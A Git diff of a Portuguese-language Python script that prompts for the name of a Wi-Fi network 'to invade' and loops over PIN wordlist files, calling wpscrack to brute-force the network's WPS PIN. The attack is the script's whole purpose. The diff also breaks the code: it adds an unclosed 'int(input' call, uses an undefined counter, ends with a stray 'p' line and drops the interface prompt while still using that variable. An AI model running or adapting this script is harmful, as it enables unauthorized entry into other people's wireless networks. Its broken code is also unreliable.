@@ -19,14 +19,14 @@ else:
     print("Nenhuma interface Wi-Fi encontrada.")
 time.sleep(1)
 print("")
-while True:
-    n=0
-    n=n+1
-    s="0"
-    s=str(n)
+print("Digite onde você deseja começar.")
+int(input
+s="0"
+s=str(n)
 
-    wifi_interface = input("Qual o nome da sua interface Wifi? ")
-    ssid = input("Qual o nome da rede que deseja invadir? ")
+
+ssid = input("Qual o nome da rede que deseja invadir? ")
+while True:
     pins_file = "wordlistofc"+s+".txt"
     def connect_wifi(pin):
         command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
@@ -48,3 +48,4 @@ while True:
 
     if __name__ == "__main__":
         main()
+    p
